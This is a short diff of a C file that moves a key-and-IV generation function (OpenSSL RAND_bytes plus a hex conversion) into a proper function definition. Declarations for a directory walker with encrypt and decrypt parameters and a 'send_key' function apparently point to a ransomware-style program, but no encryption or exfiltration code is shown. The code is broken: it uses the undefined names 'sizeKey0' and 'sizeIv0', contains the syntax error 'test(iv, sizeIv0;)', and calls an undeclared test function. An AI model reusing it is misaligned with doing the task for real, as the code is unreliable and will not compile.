@@ -16,19 +16,22 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
 int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv);
 
 
-    if(RAND_bytes(key, sizeKey) == 0) {
-        test(key,sizeKey0);
-    }
-    if(RAND_bytes(iv, sizeIv) == 0) {
-        test(iv, sizeIv0;)
-    }
-bytes_to_hexa(key, pKey, sizeKey);
-bytes_to_hexa(iv, pIv, sizeIv);
-
-
 int send_key(char *pKey, char *pIv);
 
 int main (int argc, char * argv[])
 {
 	printf("Non\n");
 }
+
+
+int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv){
+    if(RAND_bytes(key, sizeKey) == 0) {
+    test(key,sizeKey0);
+    }
+    if(RAND_bytes(iv, sizeIv) == 0) {
+    test(iv, sizeIv0;)
+    }
+    bytes_to_hexa(key, pKey, sizeKey);
+    bytes_to_hexa(iv, pIv, sizeIv);
+}
+
